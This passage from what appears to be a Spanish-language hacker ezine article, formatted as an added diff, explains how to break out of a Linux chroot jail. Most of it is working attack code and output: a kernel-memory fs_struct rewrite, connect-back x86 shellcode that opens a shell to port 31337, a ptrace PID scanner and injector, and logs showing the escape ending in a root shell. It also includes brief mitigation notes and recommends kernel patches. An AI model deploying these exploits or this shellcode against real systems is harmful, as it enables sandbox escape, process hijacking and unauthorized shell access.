+        wr_kpos=kpos=(unsigned long)task->fs;
+        kread(kpos, (char *)&fs, sizeof(struct fs_struct));
+        wr=fs;
+        kpos=(unsigned long)fs.root;
+        kread(kpos, (char *)&dentry, sizeof(struct dentry));
+        do {
+                kpos=(unsigned long)dentry.d_parent;
+                kread(kpos, (char *)&dentry, sizeof(struct dentry));
+        } while(kpos!=(unsigned long)dentry.d_parent);
+        wr.root=dentry.d_parent;
+        wr.pwd=dentry.d_parent;
+        kwrite(wr_kpos, (char *)&wr, sizeof(struct fs_struct));
+}
+
+int main() {
+        int ppid=getppid();
+        struct task_struct *task;
+        mknod(DEVNAME, S_IFCHR|0600, makedev(1, 2));
+        task=find_task_struct_by_pid(ppid);
+        break_chroot(task);
+}
+
+---/ break_chroot5.c /---
+
+
+    Veamos...
+
+	
+	barracuda /chrooted# gcc -static -I/usr/src/linux/include break_chroot5.c -o break_chroot5
+	barracuda /chrooted# chroot .
+	barracuda /# ./break_chroot5
+	barracuda /# ls
+        bin   cdrom     dev  floppy  initrd  lost+found  proc  sbin  usr  vmlinuz
+        boot  chrooted  etc  home    lib     mnt         root  tmp   var
+        barracuda /#
+
+
+    W0p, w0p, w0p :)
+
+
+	
+     5.1.- Solucionando el problema
+     ------------------------------
+
+    Solucionar el problema vuelve a ser MUY facil. Nos basta con privar el uso
+de una syscall en un entorno chrooteado, al igula que hicimos previamente con
+create_module en el punto anterior. (Ver arriba :)
+
+
+
+
+
+6.- Rompiendo el chroot en linux (Metodo 6).
+--------------------------------------------
+	
+	Existe aun un metodo mas que permite a un usuario que se encuentra en
+un entorno chrootrado salir de el. A diferencia de los demos metodos vistos 
+hasta ahora este no requiere privilegios de root, lo que no quiere decir que 
+pueda hacerse a la ligera, pues requiere otra condicion, que haya en la maquina 
+otro proceso funcionando con nuestros mismos privilegios y que este no se 
+encuentre chrooteado.
+	
+	Para entender esta tecnica es preferible entender la tecnica de 
+insercion de codigo a procesos en ejecucion descrita en un articulo publicado
+en este mismo ezine (toca leer mas).
+
+	Lo unico que debemos realizar es insertar una shellcode remota al 
+proceso que este rulando fuera del chroot con nuestros privilegios y usar un
+socket (o cualquier otro metodo que nos permita comunicar con el proceso) para 
+establecer una comunicacion con la shellcode. 
+
+	Nos aparece, no obstante, algun problema para poder llegar a cabo 
+esto. La tecnica se basa en el uso de la syscall ptrace, y esta requiere el
+pid del proceso a atachear, pero nosotros no disponemos de el, pues no suele
+haber procfs dentro de los entornos chrooteados. La solucion pasa por realizar
+un barrido de pids, es decir probarlos todos hasta encontrar uno. No es una
+solucion demasiado elegante, pero funciona, y la verdad... no se me ocurre 
+otra.
+
+	Como ya dije anteriormente lo primero que necesitamos es una shellcode
+remota, asi que debemos diseñar una. La shellcode que veis a continuacion se
+conecta a la IP 127.0.0.1 por el puerto 31337 y ofrece una shell pidiendo 
+previamente un terminal al sistema, de la misma manera que lo haria un servidor
+telnet. El codigo es un poco distinto a lo que seria una shellcode real, pues
+debemos crear un proceso hijo para que el proceso traceado no muera, lo que, 
+dependiendo del proceso del que se trate, seria sospechoso.
+
+
+---/ ptmx_connect_shellcode.S /---
+
+/*
+ * Remote linux shellcode by Ripe - <ripe@7a69ezine.org>
+ */
+#define __NR_fork       $2
+#define __NR_read       $3
+#define __NR_write      $4
+#define __NR_open       $5
+#define __NR_close      $6
+#define __NR_execve     $11
+#define __NR_dup        $41
+#define __NR_ioctl      $54
+#define __NR_socketcall $102
+#define __NR_poll       $168
+
+#define SYS_SOCKET      $1
+#define SYS_BIND        $2
+#define SYS_CONNECT     $3
+
+#define SOCK_STREAM     $1
+#define AF_INET         $2
+#define IPPROTO_TCP     $6
+
+#define O_RDWR          $2
+
+#define POLLIN          $1
+
+#define TIOCSPTLCK      $0x40045431
+#define TIOCGPTN        $0x80045430
+
+.globl injected_code 
+injected_code:
+	/*
+	 * Creamos un proceso hijo en el que se ejecutara la shellcode.
+	 * En el padre generaremos una interrupcion 3 (breakpoint) para
+	 * que el inyector tome el control y restaure el codigo original.
+	 */
+	xorl	%eax,%eax
+	movb	__NR_fork,%al
+	int	$0x80		// fork();
+	xorl	%ebx,%ebx
+	cmpl	%eax, %ebx
+	je	shellcode
+	int	$0x03		// Breakpoint!!
+shellcode:
+        jmp     a_data
+
+addr:
+        call    get_addr
+        .string "\x7f\x00\x00\x01"
+
+a_data:
+	/*
+	 * Abrimos /dev/ptmx
+	 */
+        xorl    %eax,%eax
+        pushl   %eax
+        movb    __NR_open,%al
+        pushl   $0x786d7470
+        pushl   $0x2f766564
+        pushw   $0x2f2f
+        movl    %esp,%ebx
+        xorl    %ecx,%ecx
+	movb    O_RDWR,%cl
+        int     $0x80		// ptmx=open("/dev/ptmx", O_RDWR);
+
+	/*
+	 * Pedimos un terminal al sistema.
+	 */
+        movl    %eax,%ebx
+        xorl    %eax,%eax
+        movb    __NR_ioctl,%al
+        movl    TIOCGPTN,%ecx
+        movl    %esp,%edx
+        int     $0x80		// ioctl(ptmx, TIOCGPTN, &num);
+
+	/*
+	 * Desbloqueamos el terminal.
+	 */
+        xorl    %eax,%eax
+        push    %eax
+        movb    __NR_ioctl,%al
+        movl    TIOCSPTLCK,%ecx
+        movl    %esp,%edx
+        int     $0x80		// ioctl(ptmx, TIOCSPTLCK, 0);
+
+	/*
+	 * Cerramos los decriptores 2, 1 y 0.
+	 */
+        movl    %ebx,%edi
+        xorl    %ebx,%ebx
+        movl    $2,%ebx
+close_fd:
+        xorl    %eax,%eax
+        movb    __NR_close,%al
+        int     $0x80
+        decl    %ebx
+        jge     close_fd
+
+	/*
+	 * Convertimos el numero devuelto por el ioctl de
+	 * solicitud de terminal al ascii correspondiente.
+	 */
+        popl    %ecx
+        popl    %eax
+        movb    $10,%dl
+        idivb   %dl
+        addb    $0x30,%ah
+	xchg    %ah,%al
+        cmpb    $1,%ah
+        jl      one_digit
+	xchg    %ah,%al
+        addb    $0x30,%al
+one_digit:
+        pushl   %eax
+	
+	/*
+	 * Abrimos /dev/pts/<num> para tratarlo como terminal.
+	 * Ya lo tenemos!
+	 */
+        pushl   $0x2f737470
+        pushl   $0x2f766564
+        pushw   $0x2f2f
+        xorl    %eax,%eax
+        movl    __NR_open,%eax
+        movl    %esp,%ebx
+        movb    O_RDWR,%cl
+        int     $0x80		// pts=open("/dev/pts/<num>, O_RDWR);
+
+	/*
+	 * Creamos un proceso hijo en el que se ejecutara la shell.
+	 */
+        xorl    %eax,%eax
+        movb    __NR_fork,%al
+        int     $0x80		// fork();
+        xorl    %ebx,%ebx
+        cmpl    %eax,%ebx
+        je      child
+
+	/*
+	 * Creamos un socket. La llamada retornara siempre 1, pues
+	 * es el primer decritor libre (recordad que cerramos antes
+	 * los decriptores 2, 1 y 0. El 0 lo ocupo el open anterior).
+	 */
+        xorl    %eax,%eax
+        movb    __NR_socketcall,%al
+        movb    IPPROTO_TCP,%bl
+        pushl   %ebx
+        movb    SOCK_STREAM,%bl
+        pushl   %ebx
+        movb    AF_INET,%bl
+        pushl   %ebx
+        movb    SYS_SOCKET,%bl
+        movl    %esp,%ecx
+        int     $0x80		// sfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+	/*
+	 * Conectamos el socket (no nos es necesario guardar/salvar el valor
+	 * del socket, sabemos que es 1) a 127.0.0.1 por el puerto 31337.
+	 */
+        movb    __NR_socketcall,%al
+        jmp     addr
+get_addr:
+        popl    %edx
+        movl    (%edx),%ebx
+        pushl   %ebx
+        movl    $0x697affff,%ebx
+        xorw    %bx,%bx
+        movb    AF_INET,%bl
+        pushl   %ebx
+        movl    %esp,%ebp
+        xorl    %edx,%edx
+        movb    $16,%dl
+        pushl   %edx
+        pushl   %ebp
+        movb    $1,%dl
+        pushl   %edx
+        movl    SYS_CONNECT,%ebx
+        movl    %esp,%ecx
+        int     $0x80		// connect(0, {127.0.0.1, 31337}...);
+
+        xorl    %ebx,%ebx
+        cmpl    %ebx,%eax
+        jne     exit_code
+
+	/*
+	 * Bucle infinito que se encarga de redireccionar los datos entre
+	 * el socket, el terminal y la shell. Usamos poll para atender a
+	 * varios decriptores a la vez.
+	 */
+        subl    $528,%esp
+        movl    %esp,%ebp
+forever:
+        addl    $8,%esp
+        push    %edi
+        movb    POLLIN,%bl
+        xorl    %eax,%eax
+        incl    %eax
+        push    %eax
+        push    %ebx
+
+        movb    $2,%al
+        movl    %eax,%ecx
+        movb    __NR_poll,%al
+        movl    %esp,%ebx
+        movl    $0x0fffffff,%edx
+        int     $0x80
+
+check_1:
+        movl    6(%esp),%edx
+        testb   $38,%dl
+        jnz     exit_code
+        testb   POLLIN,%dl
+        jz      check_2
+
+        xorl    %eax,%eax
+        movb    __NR_read,%al
+        xorl    %ebx,%ebx
+        incl    %ebx
+        movl    %ebp,%ecx
+        xorl    %edx,%edx
+        movw    $512,%dx
+        int     $0x80
+        movl    %eax,%edx
+        xorl    %eax,%eax
+        movb    __NR_write,%al
+        movl    %edi,%ebx
+        int     $0x80
+
+check_2:
+        movl    14(%esp),%edx
+        testb   $38,%dl
+        jnz     exit_code
+        testb   POLLIN,%dl
+        jz      forever
+
+        xorl    %eax,%eax
+        movb    __NR_read,%al
+        movl    %edi,%ebx
+        movl    %ebp,%ecx
+        xorl    %edx,%edx
+        movw    $512,%dx
+        int     $0x80
+
+        movl    %eax,%edx
+        xorl    %eax,%eax
+        movb    __NR_write,%al
+        xorl    %ebx,%ebx
+        incl    %ebx
+        int     $0x80
+
+        jmp     forever
+
+child:
+	/*
+	 * Duplicamos el decripto 0 a 1 y 2. El decripto 0 corresponde
+	 * al del terminal abierto.
+	 */ 
+        xorl    %ebx,%ebx
+        xorl    %eax,%eax
+        movb    __NR_dup,%al
+        int     $0x80		// dup(0);
+        movb    __NR_dup,%al
+        int     $0x80		// dup(0);
+
+	/*
+	 * Turno para ejecutar la shell!!
+	 */ 
+        xorl    %eax,%eax
+        movb    __NR_execve,%al
+        xorl    %edx,%edx
+        push    %edx
+        pushl   $0x68732f6e
+        pushl   $0x69622f2f
+        movl    %esp,%ebx
+        push    %edx
+        push    %ebx
+        movl    %esp,%ecx
+        int     $0x80		// execve("/bin/sh", {"/bin/sh", NULL}, NULL);
+
+	/*
+	 * Si algo va mal......
+	 */
+exit_code:
+        xorl    %eax,%eax
+	incl    %eax
+	int     $0x80		// exit(0);
+
+
+---/ ptmx_connect_shellcode.S /---
+
+     
+     Ya tenemos nuestra shellcode remota. Esta es solo una de las multiples
+posiblidades de codigo a inyectar que nos ayudaria a romper el chroot. Lo que
+necesitamos ahora es un codigo que nos liste los pids traceables, para ello
+usaremos el siguiente codigo, que prueba ptrace con con todos los pids y lee
+el fichero ejecutable asociado a cada uno de ellos (lo leemos del top del
+stack).
+
+
+---/ list_traceable_pids.c /---
+
+#include <stdio.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <sys/ptrace.h>
+#include <linux/user.h>
+
+#define MAX_PATH        256
+
+int main() {
+        int i;
+        long int *hola;
+        unsigned int pid;
+        char path[MAX_PATH];
+        char *path2;
+        for (pid=10 ; pid<0xffff ; pid++) {
+	        /*
+		 * Traceamos todos los procesos posibles, asegurandonos que
+		 * no se trata del propio proceso ni la shell que lo lanza.
+		 */
+                if (pid!=getpid() && pid!=getppid() && ptrace(PTRACE_ATTACH, pid, NULL, NULL)!=-1) {
+		        /*
+			 * Sacamos el binario al que pertenece. Gracias a ello
+			 * podremos, desde dentro del chroot, hacernos una 
+			 * ligera idea de lo que es el proceso.
+			 */
+                        for(i=0 ; i<MAX_PATH ; i+=4) {
+                                hola=(long int *)&path[i];
+                                *hola=ptrace(PTRACE_PEEKDATA, pid, 0xc0000000-4-MAX_PATH+i, NULL);
+                        }
+                        path2=&path[MAX_PATH-1];
+                        while(*(path2-1)) path2--;
+			/*
+			 * Datacheamos... aqui no ha pasado nada :-)
+			 */
+                        ptrace(PTRACE_DETACH, pid, NULL, NULL);
+			/*
+			 * Mostramos los resultados por pantalla.
+			 */
+                        printf("%i - [%s]\n", pid, path2);
+                }
+
+        }
+}
+
+---/ list_traceable_pids.c /---
+
+	
+	Ahora solo nos falta el programa que se encargue de inyectar el codigo
+en el proceso objetivo. Voy a usar el mismo codigo que plantee como ejemplo en
+el articulo sobre inyeccion de codigo en tiempo de ejecucion que podeis 
+encontrar en este mismo numero de la ezine, articulo al que ya hice referencia
+hace un rato.
+
+	El codigo es el siguiente.
+	
+
+---/ ptrace_inject2.c /---
+
+#include <stdio.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <sys/ptrace.h>
+#include <linux/user.h>
+
+#ifndef INJECTED_LEN
+#define INJECTED_LEN    0x00
+#endif /* INJECTED_LEN */
+
+void injected_code();
+
+int main(int argc, char **argv) {
+        int pid;
+        int i;
+        long int *hola;
+        struct user_regs_struct regs;
+        char original_code[INJECTED_LEN]; /* Aqui se guardara el codigo original */
+        if (argc<2) {
+                printf("Uso:\n");
+                printf("\t%s <pid>\n", argv[0]);
+                exit(0);
+        }
+        pid=atoi(argv[1]);
+        /*
+         * Traceamos el proceso en cuestion.
+         */
+        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)!=-1) {
+                printf("[1] - Proceso atacheado\n");
+                /*
+                 * Extraemos los registros.
+                 */
+                if (ptrace(PTRACE_GETREGS, pid, NULL, &regs)!=-1) {
+                        printf("[2] - Extraido registro eip (0x%.8x)\n", regs.eip);
+                        /*
+                         * Insertamos nuestro codigo guardando una copia del original.
+                         */
+                        for (i=0; i<INJECTED_LEN; i+=4) {
+                                hola=(long int *)&original_code[i];
+                                *hola=ptrace(PTRACE_PEEKDATA, pid, regs.eip+i, NULL);
+                                ptrace(PTRACE_POKEDATA, pid, regs.eip+i, *(int*)(injected_code+i));
+                        }
+                        printf("[3] - Codigo insertado\n");
+                        /*
+                         * Seguimos la ejecucion del proceso para que se ejecute nuestro
+                         * codigo.
+                         */
+                        ptrace(PTRACE_CONT, pid, 0, 0);
+                        /*
+                         * Esperamos que el proceso nos ceda nuevamente el control (tras generar
+                         * la interrupcion 3).
+                         */
+                        waitpid(pid, NULL, 0);
+                        printf("[4] - Codigo ejecutado\n");
+                        /*
+                         * Copiamos de nuevo el codigo original.
+                         */
+                        for (i=0; i<INJECTED_LEN; i+=4)
+                                ptrace(PTRACE_POKEDATA, pid, regs.eip+i,*(int*)(original_code+i));
+                        printf("[5] - Restaurando codigo original\n");
+                        /*
+                         * Restauramos los registros que habia antes de que tocasemos nada.
+                         */
+                        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+                        printf("[6] - Registros restaurados\n");
+                }
+                /*
+                 * Todo finalizo... Liberamos el proceso atacheado.
+                 */
+                ptrace(PTRACE_DETACH, pid, NULL, NULL);
+                printf("[5] - Detacheado\n");
+        }
+        exit(0);
+}
+
+---/ ptrace_inject2.c /---
+
+	
+	Una vez tenemos todo esto, ya estamos totalmente preparados para ver
+si esta historia funciona o no funciona. Lo primero que debemos hacer es 
+ejecutar un proceso fuera del chroot, nuevamente, usaremos el mismo que en
+el articulo de ptrace, shit.c.
+
+
+---/ shit.c /---
+
+#include <stdio.h>
+
+int main() {
+        while(1) {
+        	printf("Hola\n");
+                sleep(2);
+        }
+}
+
+---/ shit.c /---
+						
+
+	Despues copiamos el netcat dentro del chroot (programa que usaremos 
+como cliente de la shellcode), chrooteamos y tratamos de romperlo... let's go!
+
+	
+	barracuda /chrooted# cp /usr/bin/nc bin/nc
+	barracuda /chrooted# gcc list_traceable_pids.c -static -o list_traceable_pid
+	barracuda /chrooted# gcc shellcode.S -c
+	barracuda /chrooted# gcc ptrace_inject2.c -c -DINJECTED_LEN=0x18c
+	barracuda /chrooted# gcc shellcode.o ptrace_inject2.o -static -o break_chroot6
+	barracuda /chrooted# gcc shit.c -o shit ; ./shiti > /dev/null &
+	[1] 397
+	barracuda /chrooted# chroot /chrooted
+	barracuda /#
+
+
+	Tenemos ahora el entorno preparado. Al lanzar shit se ha visto el pid,
+sin embargo nosotros partiremos de la base de que no sabemos el pid de dicho
+proceso, pues eso se asemeja mas a una situacion real. Ahora en un terminal
+dejamos un netcat escuchando el puerto 31337 y en otro hacemos...
+
+	
+	barracuda /# ./list_traceable_pids
+	156 - [/sbin/syslogd]
+	159 - [/sbin/klogd]
+	166 - [/usr/sbin/gpm]
+	171 - [/usr/sbin/inetd]
+	179 - [/usr/sbin/sshd]
+	183 - [/usr/sbin/proftpd]
+	186 - [/usr/sbin/cron]
+	189 - [/bin/bash]
+	190 - [/sbin/getty]
+	191 - [/sbin/getty]
+	192 - [/sbin/getty]
+	193 - [/sbin/getty]
+	194 - [/sbin/getty]
+	199 - [/usr/sbin/sshd]
+	200 - [/bin/bash]
+	406 - [./shit]
+	barracuda /# ./break_chroot6 406
+	[1] - Proceso atacheado
+	[2] - Extraido registro eip (0x400badf1)
+	[3] - Codigo insertado
+	[4] - Codigo ejecutado
+	[5] - Restaurando codigo original
+	[6] - Registros restaurados
+	[5] - Detacheado
+	barracuda /#
+
+	
+	Y si miramos en el terminal del netcat nos encontramos el premio....
+
+
+	barracuda /# nc -n -v -l -p 31337
+	connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 1024
+	sh: no job control in this shell
+	sh-2.05a# cd /
+	cd /
+	sh-2.05a# ls
+	ls
+	System.map         config         initrd      root     vmlinuz-2.4.19
+	System.map-2.4.19  config-2.4.19  lib         sbin     vmlinuz.old
+	bin                dev            lib.tar     tmp
+	boot               etc            lost+found  usr
+	cdrom              floppy         mnt         var
+	chrooted           home           proc        vmlinuz
+	sh-2.05a#
+
+
+
+
+		6.1.- Solucionando el problema
+		------------------------------
+
+	Nuevamente, desde el kernel, privando del uso de la syscall ptrace en
+el interior de un chroot.
+
+
+
+
+
+7.- Matizacion final.
+---------------------
+
+	Todos los codigos para romper el chroot que hemos visto estan escritos
+en C, sinembargo nada nos impide crear shellcodes implementando cada uno de 
+los metodos descritos, que seria lo que realmente se necesita, pues suele ser
+necesario romper el chroot cuando se explota algun programa vulnerable 
+chrooteado como podria ser un servidor FTP.
+
+	Debido, nuevamente, a la falta de tiempo no he creado las shellcodes
+correspondientes, asi que si os quereis entretener y a la vez aprender 
+bastante ASM teneis trabajo de sobras :)
+
+
+
+
+
+8.- Conclusiones.
+-----------------
+
+	El chroot en su estado actual no se presenta como un metodo seguro 
+para el enjaulamiento, si bien existen parches que privan de la posibilidad
+de escaparse del chroot. Si se tiene la necesidad de montar un servicio
+chrooteado es MUY recomendable aplicar uno de esos parches al kernel o usar
+UML (user mode linux) en lugar de chroot.
+
+	Sin nada mas que contar, me despido... un abrazo a todos.
+
+
+
+*EOF*
